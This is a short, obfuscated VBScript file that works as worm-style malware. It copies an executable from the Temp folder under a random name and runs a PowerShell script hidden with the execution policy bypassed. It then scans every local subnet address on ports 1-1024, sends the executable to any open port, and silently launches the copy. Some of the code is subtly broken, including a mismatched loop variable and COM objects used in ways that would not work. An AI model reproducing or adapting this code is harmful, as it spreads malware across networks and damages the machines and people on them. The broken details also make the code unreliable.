Set janus23 = CreateObject("WScript.Shell")
Set frankie9 = CreateObject("Scripting.FileSystemObject")
Set hyperweb = CreateObject("WScript.Network")
Set objRandom = CreateObject("System.Random")
Set objRequest = CreateObject("MSXML2.XMLHTTP")

ja96 = janus23.ExpandEnvironmentStrings("%Temp%\iycr.exe")

Set lo83 = frankie9.OpenTextFile(ja96, 1)
qezor = lo83.ReadAll
lo83.Close

Dim strChars, strName
strChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
For i = 1 To 10
  strName = strName & Mid(strChars, objRandom.Next(1, Len(strChars) + 1), 1)
Next
lori1 = strName & ".exe"

lauren11 = frankie9.BuildPath(janus23.ExpandEnvironmentStrings("%Temp%"), lori1)

If Not frankie9.FolderExists(frankie9.GetParentFolderName(lauren11)) Then
  frankie9.CreateFolder(frankie9.GetParentFolderName(lauren11))
End If

Set uj3 = frankie9.CreateTextFile(lauren11, True)
uj3.Write qezor
uj3.Close

janus23.Run "powershell.exe -ExecutionPolicy Bypass -File yani.ps1", 0, True

ip = hyperweb.ComputerNameIPAddresses(0)

localverse = Left(ip, InStrRev(ip, ".") - 1) & "."

For i = 1 To 255
  For junga87 = 1 to 1024
    hyperprotocol = localverse & i
    On Error Resume Next
    Set a7 = CreateObject("MSWinsock.Winsock")
    a7.Connect hyperprotocol, junga87
    If Err.Number = 0 Then
      a7.Send qezor
      Set rop34 = frankie9.CreateTextFile(lauren11, True)
      rop34.Write qezor
      rop34.Close
      Set java01 = CreateObject("WScript.Shell")
      java01.Run lauren11, 0, False
    End If
    a7.Close
    Set a7 = Nothing
  Next j
Next i